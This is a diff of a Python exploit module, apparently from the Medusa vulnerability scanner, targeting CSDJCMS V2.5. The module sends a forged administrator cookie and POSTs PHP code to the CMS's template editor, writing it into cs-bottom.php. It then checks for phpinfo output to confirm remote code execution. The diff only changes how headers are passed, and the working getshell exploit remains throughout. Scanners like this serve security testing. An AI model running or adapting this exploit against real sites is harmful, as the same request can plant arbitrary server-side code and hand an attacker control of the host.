@@ -21,7 +21,7 @@ class VulnerabilityInfo(object):
         self.info['version'] = "CSDJCMS(程氏舞曲管理系统)V2.5"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
     scheme, url, port = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
@@ -33,20 +33,13 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     try:
         payload_url = scheme + "://" + url + ":" + str(port)
         referer = scheme + "://" + url
-        headers = {
-            "Host": "{}".format(url),
-            "User-Agent": RandomAgent,
-            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
-            "Accept-Encoding": "gzip, deflate",
-            "Referer": "{}/admin/admin_t ... ;file=artindex.html".format(referer),
-            "Cookie": "CS_AdminID=1; CS_AdminUserName=1; CS_AdminPassWord=1; CS_Quanx=0_1,1_1,1_2,1_3,1_4,1_5,2_1,2_2,2_3,2_4,2_5,2_6,2_7,3_1,3_2,3_3,3_4,4_1,4_2,4_3,4_4,4_5,4_6,4_7,5_1,5_2,5_3,5_4,5_5,6_1,6_2,6_3,7_1,7_2,8_1,8_2,8_3,8_4; CS_Login=a3f5f5a662e8a36525f4794856e2d0a2; PHPSESSID=48ogo025b66lkat9jtc8aecub1; CNZZDATA3755283=cnzz_eid%3D1523253931-1364956519-http%253A%252F%252Fwww.djkao.com%26ntime%3D1364956519%26cnzz_a%3D1%26retime%3D1365129491148%26sin%3D%26ltime%3D1365129491148%26rtime%3D0; bdshare_firstime=1365129335963",
-            "Connection": "keep-alive",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Content-Length": "169"
-        }
+
+        Headers["Referer"]= "{}/admin/admin_t ... ;file=artindex.html".format(referer)
+        Headers["Connection"]= "keep-alive"
+        Headers["Content-Type"]= "application/x-www-form-urlencoded"
+        Headers["Content-Length"]="169"
         data = "name=cs-bottom.php&content=%3C%3Fphp+phpinfo%28%29+%3F%3E"
-        resp = requests.post(payload_url,data=data,headers=headers, proxies=proxies,timeout=6, verify=False)
+        resp = requests.post(payload_url,data=data,headers=Headers, proxies=proxies,timeout=6, verify=False)
         con = resp.text
         if con.find('PHP Version') != -1 and con.find('System')!=-1 and con.find('Configure Command') != -1:
             Medusa = "{}存在CSDJCMSGetshell\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)
